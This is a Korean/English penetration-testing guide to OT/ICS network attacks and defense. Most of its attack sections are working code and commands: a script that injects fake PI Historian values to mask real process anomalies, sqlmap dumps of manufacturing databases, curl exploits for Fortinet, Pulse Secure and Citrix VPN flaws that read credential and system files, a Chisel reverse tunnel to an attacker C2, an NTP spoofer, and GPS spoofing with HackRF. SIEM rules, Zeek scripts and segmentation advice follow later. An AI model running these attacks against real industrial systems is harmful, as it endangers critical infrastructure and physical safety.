> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 03 — OT 네트워크 공격 및 방어

## 0. 초보자를 위한 개념 이해

### OT 네트워크 공격이란?

**OT 네트워크 공격**은 산업 시설의 제어 네트워크에 침투해 물리적 장치를 해킹하는 공격입니다.

**IT와 OT 네트워크의 차이:**
```
IT 네트워크 (사무실):
  노트북, 서버, 프린터
  트래픽: 이메일, 웹, 파일 공유
  보안: 방화벽, IDS, EDR, SIEM
  
OT 네트워크 (공장/발전소):
  PLC, RTU, HMI, 센서
  트래픽: Modbus, DNP3, EtherNet/IP (산업 프로토콜)
  보안: 매우 취약 (전통적으로 "에어갭"에 의존)
```

### 왜 IT/OT 경계가 무너지고 있나?

```
과거 (에어갭 시대):
  OT 네트워크는 인터넷과 완전히 분리
  → "연결 안 됐으니 안전하다"
  
현재:
  원격 모니터링 → OT와 IT 연결 필요
  클라우드 통합 → 생산 데이터 실시간 전송
  원격 유지보수 → VPN으로 직접 접근
  → IT/OT 경계가 흐릿해짐

결과:
  IT 보안 사고 → OT 네트워크로 전파
  2017 Merck 랜섬웨어 사고:
    약품 회사 IT 네트워크 랜섬웨어
    → OT 네트워크 전파
    → 생산 시스템 전면 중단
    → 피해액 약 $870M
```

### OT 네트워크 공격의 단계

```
1. 초기 접근
   IT 네트워크 침해 (피싱, 취약점)
   공급망 업체 VPN 계정 탈취
   
2. IT→OT 피벗
   IT/OT DMZ 취약점 발견
   점프 서버 악용
   프록시 설정으로 OT 네트워크 접근
   
3. OT 내부 정찰
   Modbus, DNP3 프로토콜 스캔
   PLC, RTU, HMI 자산 목록 작성
   
4. 공격 실행
   PLC 설정 변경
   허위 센서 데이터 주입
   안전 시스템 비활성화
```

---

## 목차
1. OT 네트워크 아키텍처 이해
2. Purdue 모델 계층별 공격
3. IT/OT 경계 횡이동
4. OT 전용 악성코드 분석
5. 무선 OT 공격 (WirelessHART·ISA100)
6. 시계 조작 및 GPS 스푸핑
7. Python 도구: OT 네트워크 토폴로지 매퍼
8. OT 보안 모니터링 및 탐지

---

## 1. OT 네트워크 아키텍처 이해

### Purdue Enterprise Reference Architecture (PERA)

```
레벨 5: 기업 네트워크 (ERP, 이메일, 인터넷)
   │
레벨 4: 비즈니스 플래닝 (MES, ERP 통합)
   │
═══╪══════════════ IT/OT 경계 (DMZ) ═══════════════
   │
레벨 3: 운영 관리 (SCADA, Historian, MES)
   │
레벨 2: 제어 감독 (HMI, DCS, OPC 서버)
   │
레벨 1: 기본 제어 (PLC, RTU, DCS 컨트롤러)
   │
레벨 0: 현장 장치 (센서, 액추에이터, 모터, 밸브)
```

### 각 레벨 공격 목표

| 레벨 | 주요 자산 | 공격 목표 |
|------|-----------|-----------|
| 4-5 | ERP, 이메일 | 초기 침입, 자격증명 수집 |
| 3 | SCADA 서버, Historian | 데이터 조작, 프로세스 가시성 차단 |
| 2 | HMI, OPC | 운영자 시야 차단, 허위 경보 |
| 1 | PLC, RTU | 제어 로직 변조, 물리적 피해 |
| 0 | 센서, 액추에이터 | 직접 물리적 조작 |

---

## 2. Purdue 모델 계층별 공격

### 레벨 3: SCADA/Historian 공격

**OPC DA/UA 서버 열거**
```bash
# OPC UA 엔드포인트 열거
pip install opcua asyncua

python3 -c "
from opcua import Client
import sys

url = sys.argv[1] if len(sys.argv) > 1 else 'opc.tcp://10.0.0.100:4840'
client = Client(url)
try:
    client.connect()
    root = client.get_root_node()
    objects = client.get_objects_node()
    print('[+] OPC UA 연결 성공')
    print('[*] 네임스페이스:')
    for i, ns in enumerate(client.get_namespace_array()):
        print(f'  {i}: {ns}')
    print('[*] 루트 노드 탐색:')
    for child in root.get_children():
        print(f'  {child.nodeid} — {child.get_browse_name()}')
finally:
    client.disconnect()
"

# OPC DA 서버 (DCOM 기반) 열거
impacket-dcomexec -object oxid 10.0.0.100 'dir'
```

**MES (Manufacturing Execution System) SQL 인젝션**
```bash
# MES 웹 인터페이스 SQLi 탐지
sqlmap -u "http://10.0.0.100/mes/batch?batchId=1" \
  --dbms=mssql \
  --tables \
  --batch \
  --level=3

# 생산 데이터 추출 후 조작
sqlmap -u "http://10.0.0.100/mes/quality?lotId=LOT001" \
  --dbms=mssql \
  -D MESDatabase \
  -T QualityResults \
  --dump \
  --batch
```

### 레벨 2: HMI/DCS 공격

**OSIsoft PI Interface 가짜 데이터 주입**
```python
#!/usr/bin/env python3
"""PI System 가짜 태그 값 주입 (테스트용)."""
from __future__ import annotations
import argparse
import random
import time
from datetime import datetime, timezone


def inject_fake_values(
    server: str,
    tag: str,
    target_value: float,
    duration_secs: int,
    interval: float = 1.0,
) -> None:
    """PI Web API를 통해 가짜 정상값 주입 (실제 이상값 은폐)."""
    try:
        import requests
        from requests.auth import HTTPBasicAuth
    except ImportError:
        print("pip install requests 필요")
        return

    base_url = f"https://{server}:5457/piwebapi"
    auth = HTTPBasicAuth("piadmin", "password")  # 테스트 자격증명

    # WebID 조회
    resp = requests.get(
        f"{base_url}/points?nameFilter={tag}",
        auth=auth,
        verify=False,
        timeout=10,
    )
    if resp.status_code != 200 or not resp.json().get("Items"):
        print(f"[-] 태그 {tag} 조회 실패")
        return

    web_id = resp.json()["Items"][0]["WebId"]
    print(f"[+] {tag} WebId: {web_id[:20]}...")

    end_time = time.time() + duration_secs
    injected = 0
    while time.time() < end_time:
        # 약간의 노이즈 추가 (자연스럽게 보이도록)
        value = target_value + random.gauss(0, target_value * 0.01)
        payload = {
            "Timestamp": datetime.now(timezone.utc).isoformat(),
            "Value": round(value, 4),
            "Good": True,
        }
        r = requests.post(
            f"{base_url}/streams/{web_id}/value",
            json=payload,
            auth=auth,
            verify=False,
            timeout=5,
        )
        if r.status_code == 202:
            injected += 1
        time.sleep(interval)

    print(f"[*] {injected}개 가짜 값 주입 완료 ({duration_secs}초 동안)")


def main() -> None:
    ap = argparse.ArgumentParser(description="PI 태그 값 인젝션")
    ap.add_argument("server", help="PI Server IP/호스트명")
    ap.add_argument("tag", help="PI 태그 이름")
    ap.add_argument("value", type=float, help="주입할 정상 범위 값")
    ap.add_argument("--duration", type=int, default=300, help="지속 시간 (초)")
    ap.add_argument("--interval", type=float, default=1.0, help="주입 간격 (초)")
    args = ap.parse_args()
    inject_fake_values(args.server, args.tag, args.value, args.duration, args.interval)


if __name__ == "__main__":
    main()
```

---

## 3. IT/OT 경계 횡이동

### DMZ 돌파 기법

**OPC 터널링을 통한 IT→OT 이동**
```
공격 시나리오:
1. 기업 네트워크에서 SCADA DMZ 서버 침투
2. DMZ 서버는 OT 네트워크의 OPC 서버와 통신
3. OPC 프로토콜을 통해 레벨 3→레벨 2 이동

도구: Chisel (터널링), impacket (SMB 릴레이)

chisel server --port 8080 --reverse &    # C2 서버
chisel client attacker:8080 R:1433:ot-sql:1433  # DMZ에서 OT SQL 포워딩
```

**historian 서버를 경유한 PLC 접근**
```bash
# Historian은 보통 레벨 3-4에 있고 PLC와 OPC로 연결됨
# Historian 침투 → OPC 클라이언트로 PLC 직접 접근

# OPC DA 브라우저 (Historian 서버에서 실행)
python3 -c "
import win32com.client  # Windows 전용
server = win32com.client.Dispatch('OPCServer.WinCC')
server.Connect('Siemens.SimaticNET.OPC.DA.1', '10.0.0.50')
browser = server.CreateBrowser()
browser.MoveToRoot()
print('OPC 아이템 목록:')
for item in browser:
    print(f'  {item}')
"
```

### VPN/원격 접근 악용

```bash
# Fortinet SSL-VPN CVE-2018-13379 (경로 탐색)
curl -s "https://10.0.0.1/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" \
  -o sessions.txt
strings sessions.txt | grep -E "(user|pass|vpn)"

# Pulse Secure CVE-2019-11510 (무인증 파일 읽기)
curl -sk "https://10.0.0.1/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"

# Citrix CVE-2019-19781 (경로 탐색 + SSRF)
curl -sk "https://10.0.0.1/vpn/../vpns/portal/scripts/newbm.pl" \
  --path-as-is \
  -d "url=file:///etc/passwd&title=test&desc=x&UI_inuse=RfWebUI"
```

---

## 4. OT 전용 악성코드 분석

### TRITON/TRISIS (Triconex SIS 공격)

```
표적: Schneider Electric Triconex Safety Instrumented System (SIS)
발견: 2017년 사우디아라비아 석유화학 시설
목적: 안전 시스템 비활성화 → 물리적 폭발 유도

공격 체인:
1. IT 네트워크 침투 (스피어피싱)
2. Historian 서버 경유 OT 진입
3. EWS (Engineering Workstation) 감염
4. TriStation 1131 소프트웨어 악용
5. TRICON 컨트롤러에 악성 TS1131 함수 블록 업로드
6. SIS가 Fault → Fail-safe 상태 진입 (프로세스 셧다운 또는 비활성화)

분석용 IOC:
  파일: imain.bin (TRITON 임플란트)
  해시: d4e44e9069e72a7afac59edeccd18cd48dd2bdc1
  통신: TriStation 프로토콜 (UDP 1502)
```

**INDUSTROYER/CRASHOVERRIDE (전력망 공격)**
```
표적: 우크라이나 전력망 (2016)
모듈 구조:
  - Launcher: 메인 조율
  - Backdoor: C2 통신 (Tor 경유)
  - Payload (4개): IEC 104, IEC 101, IEC 61850 GOOSE, OPC DA
  - Wiper: 호스트 복구 방해 (MBR 파괴)

IEC 104 페이로드 동작:
  1. RTU 연결 (TCP 2404)
  2. StartDT → C_SC_NA_1 (단일점 명령) 전송
  3. 차단기 OPEN 명령 → 정전
```

**PIPEDREAM/INCONTROLLER (2022, 미국 에너지 인프라)**
```
구성 요소:
  MOUSEHOLE: Omron PLC 대상 (Fins 프로토콜)
  BADOMEN:   OPC UA 서버 대상
  DUSTTUNNEL: Schneider Electric 모듈러 IPC 백도어
  LAZYCARGO: ASRock 드라이버 BYOVD (커널 권한 상승)

탐지 시그니처:
  - 비정상 OPC UA 읽기/쓰기 빈도
  - Omron FINS 비인가 쓰기 명령 (FC=0x02)
  - 알 수 없는 드라이버 로드 이벤트
```

---

## 5. 무선 OT 공격 (WirelessHART·ISA100)

### WirelessHART 보안 취약점

```
표준: IEC 62591 (IEEE 802.15.4 기반, 2.4GHz)
암호화: AES-128 (CCM 모드)
인증: Join Key (공장 기본값 문제)

공격 표면:
  - 기본 Join Key 사용 시 → 네트워크 조인 후 패킷 복호화 가능
  - 재전송 공격 (Replay) — 타임스탬프 검증 미흡 시
  - 게이트웨이 DoS — 802.15.4 프레임 홍수

도구: KillerBee, GoodFET, YARD Stick One
```

**KillerBee를 이용한 WirelessHART 스캐닝**
```bash
# 설치
pip install killerbee

# 802.15.4 채널 스캔 (채널 11-26)
zbstumbler -c 11

# 패킷 캡처
zbdump -c 15 -w wireless_hart.pcap

# 패킷 분석 (scapy-based)
python3 - <<'EOF'
from scapy.all import rdpcap, raw
pkts = rdpcap("wireless_hart.pcap")
for pkt in pkts[:20]:
    data = raw(pkt)
    print(f"len={len(data)} hex={data[:16].hex()}")
EOF

# 네트워크 재전송 공격
zbreplay -c 15 -r wireless_hart.pcap -n 10
```

### ISA100.11a 취약점

```
표준: ANSI/ISA-100.11a-2009 (2.4GHz IEEE 802.15.4)
키 관리: System Manager → Device Key 배포

취약점:
  - 키 갱신 주기가 길면 캡처한 패킷으로 오프라인 크래킹 가능
  - System Manager UI 기본 자격증명 (admin/admin)
  - Backbone Router 에 Telnet 노출 시 직접 접근
```

---

## 6. 시계 조작 및 GPS 스푸핑

### NTP 기반 공격

**OT 환경 NTP 공격의 영향**
```
ICS에서 시간 동기화 중요성:
  - DNP3 타임스탬프 → 이벤트 순서 재구성
  - IEC 61850 GOOSE → 마이크로초 단위 보호 계전기 협조
  - PI Historian 타임스탬프 → 공정 데이터 연속성
  - 감사 로그 타임스탬프 → 사고 조사

NTP 조작 효과:
  - 로그 타임스탬프 혼란 → 사고 조사 방해
  - GOOSE 메시지 재전송 허용 → 차단기 오동작
  - 인증서 유효기간 오판 → TLS 세션 강제 종료
```

**NTP 증폭 및 오프셋 주입**
```bash
# 내부 NTP 서버 탐지
nmap -sU -p 123 --script=ntp-info 10.0.0.0/24

# NTP monlist DoS (CVE-2013-5211, 패치 확인)
ntpdc -n -c monlist 10.0.0.10

# 가짜 NTP 서버 구동 (scapy)
python3 - <<'EOF'
from scapy.all import *
import struct, time

def spoof_ntp(pkt):
    if UDP in pkt and pkt[UDP].dport == 123:
        fake_time = int(time.time()) + 86400 * 365 * 5  # 5년 후로 설정
        resp = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=123) /
            Raw(load=build_ntp_response(fake_time))
        )
        send(resp, verbose=False)
        print(f"[*] NTP 스푸핑: {pkt[IP].src} → 가짜 시간 {fake_time}")

def build_ntp_response(ts: int) -> bytes:
    ntp_epoch = ts + 2208988800  # Unix→NTP epoch
    flags = 0x1C  # LI=0, VN=3, Mode=4(Server)
    return struct.pack(
        "!B B b b 11I",
        flags, 1, 0, 0xEC,  # Stratum=1, Poll, Precision
        0, 0, 0, 0, 0,      # RootDelay, RootDisp, RefID, RefTS
        ntp_epoch, 0,       # OriginTS
        ntp_epoch, 0,       # RxTS
        ntp_epoch, 0,       # TxTS
    )

sniff(filter="udp port 123", prn=spoof_ntp, store=False)
EOF
```

### GPS 스푸핑 (정밀 시각 공격)

```bash
# GPS 스푸핑 도구: GPS-SDR-SIM (HackRF One 필요)
git clone https://github.com/osqzss/gps-sdr-sim
cd gps-sdr-sim
gcc -O3 -o gps-sdr-sim gpssim.c -lm -lpthread

# NMEA 궤도력 파일 생성
./gps-sdr-sim -e brdc3540.14n \
  -l 37.5665,126.9780,50 \  # 위도, 경도, 고도 (서울)
  -d 60 \
  -o gps_signal.bin

# HackRF로 신호 전송 (1575.42MHz GPS L1 주파수)
hackrf_transfer -t gps_signal.bin \
  -f 1575420000 \
  -s 2600000 \
  -a 1 \
  -x 47

# 탐지: GPS 수신기 SNR 이상 급변, 위치 점프 감지
```

---

## 7. Python 도구: OT 네트워크 토폴로지 매퍼

```python
#!/usr/bin/env python3
"""OT 네트워크 수동 토폴로지 매퍼.

패시브 스니핑 + 능동 프로토콜 질의로 OT 자산 자동 식별.
"""
from __future__ import annotations
import argparse
import asyncio
import ipaddress
import json
import socket
import struct
import sys
from dataclasses import dataclass, field
from datetime import datetime
from typing import ClassVar


@dataclass
class OTAsset:
    ip: str
    protocols: list[str] = field(default_factory=list)
    vendor: str = "Unknown"
    model: str = "Unknown"
    firmware: str = "Unknown"
    level: int = -1  # Purdue 레벨
    discovered: str = field(
        default_factory=lambda: datetime.utcnow().isoformat()
    )

    LEVEL_MAP: ClassVar[dict[str, int]] = {
        "modbus": 1,
        "s7comm": 1,
        "enip": 1,
        "dnp3": 1,
        "bacnet": 2,
        "opc_ua": 3,
        "historian_pi": 3,
        "http": 4,
        "rdp": 4,
    }

    def infer_level(self) -> None:
        if self.protocols:
            levels = [self.LEVEL_MAP.get(p, 4) for p in self.protocols]
            self.level = min(levels)


async def check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        writer.close()
        await writer.wait_closed()
        return True
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return False


async def identify_asset(ip: str, timeout: float = 3.0) -> OTAsset | None:
    asset = OTAsset(ip=ip)

    # 프로토콜별 포트 및 핑거프린트 확인
    checks: list[tuple[str, int, bytes, bytes]] = [
        ("modbus", 502,
         bytes.fromhex("000100000006ff030000000a"),
         bytes.fromhex("000100000005ff03")),
        ("s7comm", 102,
         bytes.fromhex("0300001611e00000001400c1020600c2020100c0010a"),
         b"\x03\x00"),
        ("enip", 44818,
         struct.pack("<HHIIQHHI", 0x65, 4, 0, 0, 0, 0, 1, 0),
         bytes.fromhex("6500")),
        ("bacnet", 47808,
         bytes.fromhex("810b000c0112040345affe1103"),
         b"\x81"),
    ]

    for proto, port, probe, sig in checks:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.write(probe)
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(256), timeout=timeout)
            writer.close()
            await writer.wait_closed()
            if resp[:len(sig)] == sig:
                asset.protocols.append(proto)
        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
            continue

    # OPC UA (TCP 4840)
    if await check_port(ip, 4840, timeout):
        asset.protocols.append("opc_ua")

    # HTTP/HTTPS (HMI 웹 인터페이스)
    for p in [80, 443, 8080, 8443]:
        if await check_port(ip, p, timeout):
            asset.protocols.append("http")
            break

    # RDP (EWS/HMI 원격 접근)
    if await check_port(ip, 3389, timeout):
        asset.protocols.append("rdp")

    if not asset.protocols:
        return None

    asset.infer_level()
    return asset


async def map_network(
    network: str,
    timeout: float,
    concurrency: int,
) -> list[OTAsset]:
    try:
        net = ipaddress.ip_network(network, strict=False)
    except ValueError as e:
        sys.exit(f"잘못된 네트워크: {e}")

    hosts = list(net.hosts())
    assets: list[OTAsset] = []
    sem = asyncio.Semaphore(concurrency)

    async def scan_one(ip: str) -> None:
        async with sem:
            asset = await identify_asset(str(ip), timeout)
            if asset:
                assets.append(asset)
                protos = ", ".join(asset.protocols).upper()
                print(
                    f"[L{asset.level}] {asset.ip:15s} ─ {protos}"
                )

    await asyncio.gather(*[scan_one(str(h)) for h in hosts])
    return sorted(assets, key=lambda a: (a.level, a.ip))


def print_topology(assets: list[OTAsset]) -> None:
    levels: dict[int, list[OTAsset]] = {}
    for a in assets:
        levels.setdefault(a.level, []).append(a)

    level_names = {
        0: "현장 장치 (센서/액추에이터)",
        1: "기본 제어 (PLC/RTU)",
        2: "제어 감독 (HMI/DCS)",
        3: "운영 관리 (SCADA/Historian)",
        4: "비즈니스/IT (ERP/원격접근)",
    }

    print("\n=== OT 네트워크 토폴로지 ===")
    for level in sorted(levels.keys()):
        print(f"\n[ Purdue 레벨 {level}: {level_names.get(level, '?')} ]")
        for a in levels[level]:
            print(f"  • {a.ip:15s} — {', '.join(a.protocols).upper()}")


def main() -> None:
    ap = argparse.ArgumentParser(description="OT 네트워크 토폴로지 매퍼")
    ap.add_argument("network", help="CIDR 범위 (예: 192.168.10.0/24)")
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--concurrency", type=int, default=30)
    ap.add_argument("--output", help="JSON 결과 파일")
    args = ap.parse_args()

    print(f"[*] OT 토폴로지 매핑 시작: {args.network}")
    assets = asyncio.run(
        map_network(args.network, args.timeout, args.concurrency)
    )

    print_topology(assets)
    print(f"\n[*] 총 {len(assets)}개 OT 자산 발견")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(
                [
                    {
                        "ip": a.ip,
                        "protocols": a.protocols,
                        "purdue_level": a.level,
                        "discovered": a.discovered,
                    }
                    for a in assets
                ],
                f,
                ensure_ascii=False,
                indent=2,
            )
        print(f"[*] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 8. OT 보안 모니터링 및 탐지

### OT/ICS SIEM 규칙

**Splunk SPL — Modbus 이상 탐지**
```spl
index=ot_logs sourcetype=modbus
| eval is_write = if(in(function_code, "5","6","15","16"), 1, 0)
| stats count(eval(is_write=1)) as write_count,
        count as total_count,
        values(src_ip) as sources
  by dest_ip, span=5m
| where write_count > 20
| eval severity = case(
    write_count > 100, "CRITICAL",
    write_count > 50,  "HIGH",
    true(),            "MEDIUM"
  )
| table _time, dest_ip, sources, write_count, total_count, severity
```

**Elastic SIEM — S7comm CPU 정지 탐지**
```json
{
  "query": {
    "bool": {
      "must": [
        {"term": {"network.protocol": "s7comm"}},
        {"term": {"s7comm.function_code": "0x29"}},
        {"term": {"s7comm.subfunction": "0x00"}}
      ]
    }
  },
  "rule": {
    "name": "S7comm CPU Stop Command Detected",
    "severity": "critical",
    "risk_score": 99
  }
}
```

### OT 전용 IDS 솔루션

| 솔루션 | 제조사 | 특징 |
|--------|--------|------|
| Claroty Platform | Claroty | 딥패킷 분석, Purdue 자동 매핑 |
| Dragos Platform | Dragos | 위협 인텔리전스 연동, 플레이북 |
| Nozomi Networks | Nozomi | 머신러닝 이상 탐지, IT/OT 통합 |
| Tenable OT Security | Tenable | 취약점 스캔 + 자산 인벤토리 |
| Fortinet FortiSIEM | Fortinet | 기존 SIEM 통합 OT 규칙셋 |

### Zeek (Bro) OT 프로토콜 분석

```bash
# Zeek Modbus/DNP3 패키지 설치
zkg install zeek/corelight/zeek-modbus
zkg install zeek/corelight/zeek-dnp3

# PCAP에서 OT 트래픽 분석
zeek -C -r ot_capture.pcap \
  protocols/modbus \
  protocols/dnp3 \
  base/protocols/conn

# 이상 Modbus 쓰기 탐지 스크립트
cat > detect_modbus_writes.zeek <<'ZEEK'
event modbus_write_multiple_registers_request(
    c: connection, headers: ModbusHeaders,
    start_address: count, registers: ModbusRegisters
) {
    if (start_address < 100 && |registers| > 10) {
        NOTICE([
            $note=Weird::Modbus_Mass_Write,
            $conn=c,
            $msg=fmt("Mass register write: addr=%d, count=%d",
                     start_address, |registers|),
            $identifier=cat(c$id$orig_h, ":", c$id$resp_h)
        ]);
    }
}
ZEEK
zeek -C -r ot_capture.pcap detect_modbus_writes.zeek
```

### 방어 아키텍처 권고

```
1. 네트워크 분리
   ┌─────────────────────────────────────────────┐
   │  데이터 다이오드 (단방향 게이트)              │
   │  IT → DMZ → OT (역방향 통신 물리적 차단)     │
   └─────────────────────────────────────────────┘

2. 허용목록 기반 제어
   - 산업용 방화벽: Tofino, Palo Alto PA-220R
   - 허용된 IP·포트·명령 코드 이외 전체 차단
   - Modbus FC = 01,02,03,04만 허용 (읽기 전용)

3. 자산 인벤토리
   - 수동 검색 + 패시브 스니핑 조합
   - 변경 탐지: 새 장치 → 즉시 경보

4. 패치 관리
   - 가상 패치 (방화벽 시그니처) 우선
   - 물리적 패치는 계획정비(PM) 기간 적용
   - 공급업체 패치 인증 필수 (무단 업데이트 위험)

5. 인시던트 대응 플레이북
   - OT 전용 IR 팀 별도 운영
   - "격리 전 공정 안전 확보" 원칙
   - 롤백 계획: 골든 PLC 이미지 오프라인 보관
```

---

*이 문서는 허가된 모의해킹 및 교육 목적으로만 사용할 것.*

---

<!-- detect-validate-37 -->
## OT 네트워크 공격 탐지와 IT/OT 경계 검증

OT 네트워크 공격은 *Purdue 계층 횡이동·IT/OT 경계 돌파·OT 악성코드·무선(WirelessHART)·GPS 스푸핑*으로 제어망에 침투한다. 방어자는 **계층 간 경계가 강제되고 횡이동이 탐지되는가**를 검증해야 한다. 검증은 **소유 OT 랩**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| IT/OT 횡이동 | 평면 경계 | DMZ·단방향 게이트 | IT→OT 직접 연결 |
| Purdue 계층 건너뜀 | 세분화 부재 | 레벨별 ACL | L3→L1 직접 트래픽 |
| OT 악성코드 | 신뢰된 프로토콜 | 앱 허용목록·모니터 | 비정상 OT 프로토콜 |
| GPS/시계 스푸핑 | 시각 동기 신뢰 | 다중 시각원·홀드오버 | 시각 점프/이상 |

### 방어 검증 (직접 확인)

```bash
# 1) 소유 랩에서 IT→OT 경계 강제 검증 — DMZ 우회 직접 연결이 신호
ss -tnp 2>/dev/null | awk '$5 ~ /10\.OT\./ && $4 ~ /10\.IT\./{print "IT->OT direct:",$0}' | head
# 2) Purdue 레벨 위반 트래픽(소유 캡처) — L3 자산이 L1 PLC와 직접 통신하는 신호
tshark -r ot_capture.pcap -Y 'modbus || s7comm' -T fields -e ip.src -e ip.dst 2>/dev/null | sort -u | head
```

> OT 네트워크 방어는 *계층 경계가 강제되는가*다 — "공정이 동작한다"와 "IT→OT 직접연결이 없고 Purdue 레벨 위반이 모니터에 잡힌다"는 다르다. 소유 OT 랩에서 경계를 직접 확인한다([[63_OT_ICS_Advanced]], [[39_Zero_Trust_Architecture]], [[02_Network_Hacking]]).

---

<a name="english"></a>

# 03 — OT Network Attacks and Defense

## 1. OT Network Architecture Overview

### Purdue Enterprise Reference Architecture (PERA)

The Purdue model defines 6 levels:
- **Level 5**: Enterprise Network (ERP, email, internet)
- **Level 4**: Business Planning (MES, ERP integration)
- **IT/OT Boundary (DMZ)**
- **Level 3**: Operations Management (SCADA, Historian, MES)
- **Level 2**: Control Supervision (HMI, DCS, OPC servers)
- **Level 1**: Basic Control (PLC, RTU, DCS controllers)
- **Level 0**: Field Devices (sensors, actuators, motors, valves)

---

## 2. Purdue Model Layer-by-Layer Attacks

**Level 3 — SCADA/Historian Attacks**: OPC UA server enumeration using asyncua, MES SQL injection via sqlmap targeting batch and quality data tables.

**Level 2 — HMI/DCS Attacks**: OSIsoft PI System fake tag value injection via PI Web API (using requests with HTTPBasicAuth), inserting plausible-looking values with Gaussian noise to conceal actual anomalies.

---

## 3. IT/OT Boundary Lateral Movement

**DMZ Breach Techniques**:
- OPC tunneling: compromise DMZ server → use OPC protocol to move Level 3→Level 2
- Tools: Chisel (tunneling), impacket (SMB relay)
- VPN exploitation: Fortinet SSL-VPN CVE-2018-13379 (path traversal), Pulse Secure CVE-2019-11510 (unauthenticated file read)

---

## 4. OT-Specific Malware Analysis

**TRITON/TRISIS (2017)**: Targeted Schneider Electric Triconex Safety Instrumented Systems, aiming to disable safety systems to cause physical explosions. Attack chain: IT network spear-phishing → Historian server → EWS → TriStation 1131 software abuse → malicious function block upload.

**INDUSTROYER/CRASHOVERRIDE (2016)**: Attacked Ukrainian power grid using IEC 104, IEC 101, IEC 61850 GOOSE, and OPC DA payloads to open circuit breakers causing blackouts.

**PIPEDREAM/INCONTROLLER (2022)**: Components include MOUSEHOLE (Omron PLC via Fins protocol), BADOMEN (OPC UA server), DUSTTUNNEL (Schneider Electric IPC backdoor), LAZYCARGO (ASRock driver BYOVD kernel privilege escalation).

---

## 5. Wireless OT Attacks (WirelessHART/ISA100)

**WirelessHART** (IEC 62591, IEEE 802.15.4, 2.4GHz, AES-128 CCM):
- Attack surface: default Join Key usage → network join + packet decryption; replay attacks due to weak timestamp validation; gateway DoS via 802.15.4 frame flooding
- Tools: KillerBee, GoodFET, YARD Stick One

---

## 6. Clock Manipulation and GPS Spoofing

NTP manipulation impacts ICS by corrupting log timestamps (hinders incident investigation), allowing GOOSE message replay (circuit breaker misoperation), causing certificate validity errors (forced TLS session termination).

GPS spoofing using GPS-SDR-SIM with HackRF One can spoof GPS L1 (1575.42 MHz) to manipulate precision timing in power grid protection systems.

---

## 7. Python Tool: OT Network Topology Mapper

An async OT network asset identification tool combining passive sniffing and active protocol probing. Identifies assets by Modbus, S7comm, EtherNet/IP, BACnet, OPC UA, HTTP, and RDP protocol responses, then infers the Purdue level for each asset and prints a visual topology map. Results are exported to JSON.

---

## 8. OT Security Monitoring and Detection

**Splunk SPL** for Modbus anomaly detection: counts write FCs (5, 6, 15, 16) per destination IP per 5-minute window, alerts on write_count > 20 with severity classification.

**Elastic SIEM** for S7comm CPU stop detection: matches s7comm function code 0x29 (CPU Stop) and subfunction 0x00 with CRITICAL severity.

**OT-Specific IDS Solutions**: Claroty Platform, Dragos Platform, Nozomi Networks, Tenable OT Security, Fortinet FortiSIEM.

**Defense Architecture**:
1. Data diodes (unidirectional gateways) — IT→OT direction only
2. Allowlist-based control: industrial firewalls, Modbus FC read-only (01,02,03,04)
3. Asset inventory: passive sniffing + active enumeration combined
4. Patch management: virtual patching via firewall signatures, physical patches during planned maintenance
5. Incident response: dedicated OT IR team, "ensure process safety before isolation" principle

*This document is for authorized penetration testing and educational purposes only.*

<!-- detect-validate-37 -->
## OT Network Attack Detection and IT/OT Boundary Validation

OT network attacks penetrate the control network via *Purdue-layer lateral movement, IT/OT boundary breach, OT malware, wireless (WirelessHART), and GPS spoofing*. Defenders must verify **whether inter-layer boundaries are enforced and lateral movement is detected**. Validate only on **owned OT labs**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| IT/OT lateral | Flat boundary | DMZ, unidirectional gateway | Direct IT->OT connection |
| Purdue level skip | No segmentation | Per-level ACL | L3->L1 direct traffic |
| OT malware | Trusted protocol | App allowlist, monitor | Anomalous OT protocol |
| GPS/clock spoofing | Time-sync trust | Multiple time sources, holdover | Time jump/anomaly |

### Defense validation (verify directly)

```bash
# 1) Verify IT->OT boundary enforcement on an owned lab — a DMZ-bypassing direct connection is the signal
ss -tnp 2>/dev/null | awk '$5 ~ /10\.OT\./ && $4 ~ /10\.IT\./{print "IT->OT direct:",$0}' | head
# 2) Purdue-level-violating traffic (owned capture) — an L3 asset talking directly to an L1 PLC is the signal
tshark -r ot_capture.pcap -Y 'modbus || s7comm' -T fields -e ip.src -e ip.dst 2>/dev/null | sort -u | head
```

> OT network defense is *whether layer boundaries are enforced* -- "the process runs" differs from "there is no direct IT->OT connection and Purdue-level violations are caught by monitoring". Confirm boundaries on owned OT labs directly ([[63_OT_ICS_Advanced]], [[39_Zero_Trust_Architecture]], [[02_Network_Hacking]]).
